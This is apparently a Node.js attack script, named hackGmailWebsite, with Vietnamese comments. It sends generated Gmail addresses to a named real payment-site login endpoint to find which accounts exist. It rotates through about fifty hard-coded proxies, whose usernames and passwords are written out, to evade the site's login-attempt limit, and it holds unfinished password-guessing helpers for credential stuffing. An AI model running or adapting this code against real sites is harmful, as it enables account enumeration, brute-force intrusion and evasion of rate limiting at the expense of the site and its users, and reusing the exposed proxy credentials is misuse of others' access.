const axios = require('axios');



// const stringProxy =
//     "157.15.38.229:27434:userdata04:passdata04\n" +
//     "157.15.39.57:37432:userdata04:passdata04\n" +
//     "157.15.39.55:37432:userdata04:passdata04\n" +
//     "157.15.39.54:37432:userdata04:passdata04\n" +
//     "157.15.39.50:35270:userdata04:passdata04\n" +
//     "157.15.39.40:37432:userdata04:passdata04\n" +
//     "157.15.39.39:37432:userdata04:passdata04\n" +
//     "157.15.39.158:37432:userdata04:passdata04\n" +
//     "157.15.39.191:37432:userdata04:passdata04\n" +
//     "157.15.39.36:35270:userdata04:passdata04\n" +
//     "157.15.39.35:37432:userdata04:passdata04\n" +
//     "157.15.39.34:37432:userdata04:passdata04\n" +
//     "157.15.39.33:37432:userdata04:passdata04\n" +
//     "157.15.39.32:37432:userdata04:passdata04\n" +
//     "157.15.39.31:37432:userdata04:passdata04\n" +
//     "157.15.39.30:37432:userdata04:passdata04\n" +
//     "157.15.38.230:37432:userdata04:passdata04\n" +
//     "157.15.39.68:27434:userdata04:passdata04\n" +
//     "157.15.39.67:37432:userdata04:passdata04\n" +
//     "157.15.39.66:27434:userdata04:passdata04\n" +
//     "157.15.39.64:27434:userdata04:passdata04\n" +
//     "157.15.39.63:37432:userdata04:passdata04\n" +
//     "157.15.39.62:36254:userdata04:passdata04\n" +
//     "157.15.39.61:37432:userdata04:passdata04\n" +
//     "157.15.39.60:37432:userdata04:passdata04\n" +
//     "157.15.39.59:27434:userdata04:passdata04\n" +
//     "157.20.62.220:31423:user:data06\n" +
//     "45.56.174.157:6410:lamproxy019:lamproxy019\n" +
//     "147.185.250.112:6898:lamproxy019:lamproxy019\n" +
//     "142.147.244.6:6250:lamproxy019:lamproxy019\n" +
//     "161.123.101.253:6879:lamproxy019:lamproxy019\n" +
//     "142.147.244.108:6352:lamproxy019:lamproxy019\n" +
//     "142.111.245.57:5924:lamproxy019:lamproxy019\n" +
//     "160.22.174.162:27434:userdata05:passdata05\n" +
//     "160.22.174.161:31423:userdata05:passdata05\n" +
//     "160.22.174.160:31423:userdata05:passdata05\n" +
//     "160.22.174.159:27434:userdata05:passdata05\n" +
//     "160.22.174.158:21433:userdata05:passdata05\n" +
//     "160.22.174.157:37432:userdata05:passdata05\n" +
//     "160.22.174.156:21433:userdata05:passdata05\n" +
//     "160.22.174.155:21433:userdata05:passdata05\n" +
//     "160.22.174.154:37432:userdata05:passdata05\n" +
//     "160.22.174.153:31423:userdata05:passdata05\n" +
//     "160.22.174.152:37432:userdata05:passdata05\n" +
//     "160.22.174.151:21433:userdata05:passdata05\n" +
//     "160.22.174.150:21433:userdata05:passdata05\n" +
//     "160.22.174.149:31324:userdata05:passdata05\n" +
//     "160.22.174.148:31324:userdata05:passdata05\n" +
//     "160.22.174.146:24253:userdata05:passdata05"
//
// let proxy = [];
// for (let i = 0; i < stringProxy.split('\n').length; i++) {
//     let data = stringProxy.split('\n')[i].split(':');
//     let config = {
//         "protocol": "http",
//         "host": data[0],
//         "port": data[1],
//         "auth": {
//             "username": data[2],
//             "password": data[3]
//         }
//     }
//     proxy.push(config);
// }
// console.log(proxy);

let proxy = [
    {
        protocol: 'https',
        host: '157.15.38.229',
        port: '27434',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.15.39.57',
        port: '37432',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.15.39.55',
        port: '37432',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.15.39.54',
        port: '37432',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.15.39.50',
        port: '35270',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.15.39.40',
        port: '37432',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.15.39.39',
        port: '37432',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.15.39.158',
        port: '37432',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.15.39.191',
        port: '37432',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.15.39.36',
        port: '35270',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.15.39.35',
        port: '37432',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.15.39.34',
        port: '37432',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.15.39.33',
        port: '37432',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.15.39.32',
        port: '37432',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.15.39.31',
        port: '37432',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.15.39.30',
        port: '37432',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.15.38.230',
        port: '37432',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.15.39.68',
        port: '27434',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.15.39.67',
        port: '37432',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.15.39.66',
        port: '27434',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.15.39.64',
        port: '27434',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.15.39.63',
        port: '37432',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.15.39.62',
        port: '36254',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.15.39.61',
        port: '37432',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.15.39.60',
        port: '37432',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.15.39.59',
        port: '27434',
        auth: { username: 'userdata04', password: 'passdata04' }
    },
    {
        protocol: 'https',
        host: '157.20.62.220',
        port: '31423',
        auth: { username: 'user', password: 'data06' }
    },
    {
        protocol: 'https',
        host: '45.56.174.157',
        port: '6410',
        auth: { username: 'lamproxy019', password: 'lamproxy019' }
    },
    {
        protocol: 'https',
        host: '147.185.250.112',
        port: '6898',
        auth: { username: 'lamproxy019', password: 'lamproxy019' }
    },
    {
        protocol: 'https',
        host: '142.147.244.6',
        port: '6250',
        auth: { username: 'lamproxy019', password: 'lamproxy019' }
    },
    {
        protocol: 'https',
        host: '161.123.101.253',
        port: '6879',
        auth: { username: 'lamproxy019', password: 'lamproxy019' }
    },
    {
        protocol: 'https',
        host: '142.147.244.108',
        port: '6352',
        auth: { username: 'lamproxy019', password: 'lamproxy019' }
    },
    {
        protocol: 'https',
        host: '142.111.245.57',
        port: '5924',
        auth: { username: 'lamproxy019', password: 'lamproxy019' }
    },
    {
        protocol: 'https',
        host: '160.22.174.162',
        port: '27434',
        auth: { username: 'userdata05', password: 'passdata05' }
    },
    {
        protocol: 'https',
        host: '160.22.174.161',
        port: '31423',
        auth: { username: 'userdata05', password: 'passdata05' }
    },
    {
        protocol: 'https',
        host: '160.22.174.160',
        port: '31423',
        auth: { username: 'userdata05', password: 'passdata05' }
    },
    {
        protocol: 'https',
        host: '160.22.174.159',
        port: '27434',
        auth: { username: 'userdata05', password: 'passdata05' }
    },
    {
        protocol: 'https',
        host: '160.22.174.158',
        port: '21433',
        auth: { username: 'userdata05', password: 'passdata05' }
    },
    {
        protocol: 'https',
        host: '160.22.174.157',
        port: '37432',
        auth: { username: 'userdata05', password: 'passdata05' }
    },
    {
        protocol: 'https',
        host: '160.22.174.156',
        port: '21433',
        auth: { username: 'userdata05', password: 'passdata05' }
    },
    {
        protocol: 'https',
        host: '160.22.174.155',
        port: '21433',
        auth: { username: 'userdata05', password: 'passdata05' }
    },
    {
        protocol: 'https',
        host: '160.22.174.154',
        port: '37432',
        auth: { username: 'userdata05', password: 'passdata05' }
    },
    {
        protocol: 'https',
        host: '160.22.174.153',
        port: '31423',
        auth: { username: 'userdata05', password: 'passdata05' }
    },
    {
        protocol: 'https',
        host: '160.22.174.152',
        port: '37432',
        auth: { username: 'userdata05', password: 'passdata05' }
    },
    {
        protocol: 'https',
        host: '160.22.174.151',
        port: '21433',
        auth: { username: 'userdata05', password: 'passdata05' }
    },
    {
        protocol: 'https',
        host: '160.22.174.150',
        port: '21433',
        auth: { username: 'userdata05', password: 'passdata05' }
    },
    {
        protocol: 'https',
        host: '160.22.174.149',
        port: '31324',
        auth: { username: 'userdata05', password: 'passdata05' }
    },
    {
        protocol: 'https',
        host: '160.22.174.148',
        port: '31324',
        auth: { username: 'userdata05', password: 'passdata05' }
    },
    {
        protocol: 'https',
        host: '160.22.174.146',
        port: '24253',
        auth: { username: 'userdata05', password: 'passdata05' }
    }
];


function generateRandomGmail(numEmails = 1) {
    // Danh sách họ phổ biến của người Việt
    const hoList = ["Nguyen", "Tran", "Le", "Pham", "Hoang", "Phan", "Vu", "Vo", "Dang", "Bui"];

    // Danh sách tên đệm phổ biến
    const demList = ["Van", "Thi", "Minh", "Cong", "Duc", "Bao", "Anh", "Quoc", "Kim", "Huu"];

    // Danh sách tên phổ biến
    const tenList = ["An", "Binh", "Chi", "Dung", "Hai", "Lan", "Linh", "My", "Nam", "Tam", "Thao", "Huy", "Hoang"];

    const generatedEmails = [];

    for (let i = 0; i < numEmails; i++) {
        // Chọn ngẫu nhiên họ, đệm, và tên
        const ho = hoList[Math.floor(Math.random() * hoList.length)];
        const dem = demList[Math.floor(Math.random() * demList.length)];
        const ten = tenList[Math.floor(Math.random() * tenList.length)];

        // Ghép lại thành một phần tên trước dấu @
        let emailName = `${ho.toLowerCase()}${dem.toLowerCase()}${ten.toLowerCase()}`;

        // Thêm số ngẫu nhiên từ 2 đến 4 chữ số để tránh trùng lặp
        const randomNumber = Math.floor(Math.random() * (9999 - 10 + 1)) + 10;  // Số ngẫu nhiên từ 10 đến 9999
        emailName += randomNumber;

        // Kết thúc bằng @gmail.com
        const email = `${emailName}@gmail.com`;

        generatedEmails.push(email);
    }

    return generatedEmails.length > 1 ? generatedEmails : generatedEmails[0];
}

function generateRandomPassword(email, level) {
    const emailName = email.split('@')[0].replace(/\./g, '');
    let password = '';

    if (level === 'easy') {
        // Mật khẩu dễ: Tên trong email + số ngẫu nhiên
        password = emailName + Math.floor(Math.random() * 1000);
    } else if (level === 'medium') {
        // Mật khẩu trung bình: Tên trong email + ký tự đặc biệt + số ngẫu nhiên
        const specialChars = ['@', '#', '$', '%', '!', '*'];
        const randomSpecialChar = specialChars[Math.floor(Math.random() * specialChars.length)];
        const randomNumber = Math.floor(Math.random() * 100);

        password = emailName + randomSpecialChar + randomNumber;
    } else if (level === 'hard') {
        // Mật khẩu khó: Kết hợp chữ hoa, thường, số và ký tự đặc biệt
        const specialChars = ['@', '#', '$', '%', '!', '*', '&', '?'];
        const randomSpecialChar = specialChars[Math.floor(Math.random() * specialChars.length)];
        const randomNumber = Math.floor(Math.random() * 1000);

        password = emailName[0].toUpperCase() + emailName.substring(1).toLowerCase(); // Tên với chữ hoa thường
        password += randomSpecialChar + randomNumber;

        const randomSpecialChar2 = specialChars[Math.floor(Math.random() * specialChars.length)];
        password = password.substring(0, password.length / 2) + randomSpecialChar2 + password.substring(password.length / 2);
    }
}

function generatePasswordsForEmails(emails, numPasswords = 100) {
    if (numPasswords <= 0) {
        //int.MaxValue = 2147483647
        numPasswords = 2147483647;
    }
    let level = ['easy', 'medium', 'hard'];

    // Chạy vòng lặp để tạo nhiều mật khẩu với độ khó khác nhau
    for (let i = 0; i < numPasswords; i++) {
        emails.forEach(email => {
            // Mỗi email tạo 3 cấp độ mật khẩu (dễ, trung bình, khó)
            for (let j = 0; j < level.length; j++) {
                generateRandomPassword(email, level[j])
            }
        });
    }
}


const hackGmailWebsite = async () => {
    let emailIsExist = false;
    let emailExist = "";
    let i = 0;
    do {
        try {
            emailExist = generateRandomGmail();
            //connect with website
            const options = {
                method: 'POST',
                url: 'https://demo-payment.centrix.im/users/login',
                proxy: proxy[i],
                headers: {'Content-Type': 'application/json'},
                data: {email: emailExist, password: 'xxx'}
            };

            let res = await axios.request(options);
            if (res.data['detail'] != null) {
                emailIsExist = true;
            }
        } catch (error) {
            //check if status code is 401
            if (error.response.status == 401) {
                emailIsExist = true;
            }
            //error = RetryLoginLimitExceeded
            if (error.response.data['error'] == "RetryLoginLimitExceeded") {
                i++;
            }
        }
    } while (!emailIsExist)
    if (emailIsExist) {
        console.log("Email exist: " + emailExist);
    }
}

hackGmailWebsite();